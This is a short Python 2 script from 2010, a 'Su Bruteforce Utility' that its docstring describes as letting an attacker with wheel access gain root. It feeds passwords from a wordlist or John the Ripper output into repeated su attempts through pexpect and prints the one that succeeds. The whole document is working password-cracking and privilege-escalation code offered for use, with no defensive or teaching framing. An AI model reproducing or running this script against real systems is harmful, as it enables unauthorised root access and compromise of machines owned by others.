#!/usr/bin/env python
"""
su_brute1.py
by Javantea
Aug 10, 2010

Su Bruteforce Utility version 0.1
Allows an attacker with wheel access to gain root priviledges using a 
dictionary or bruteforce attack provided by pipe.
For example:
./john --stdout --incremental | python su_brute1.py
python su_brute1.py < rockyou1_order.txt
"""

import pexpect
from sys import stdin

password_test = '#'
password_found = [] 

while password_test:
# need to multiply child for faster brute 
	password_test = stdin.readline().strip()
#	print "password tested is " + password_test # debug 
	child = pexpect.spawn('su')
	child.expect('Password:')
	child.sendline(password_test)
	data  = child.readline()
	data += child.readline()
	data += child.readline()
	failure = ('su: Authentication failure' in data)
	child.close()
#	print 'data1:', data # debug 
	if not failure:
		print 'data2:', repr(data)
		if 'Permission denied' in data:
			print 'You are not in wheel, sorry.'
			break
		#end if
		print "password found:", password_test
		break
	#end if
#loop

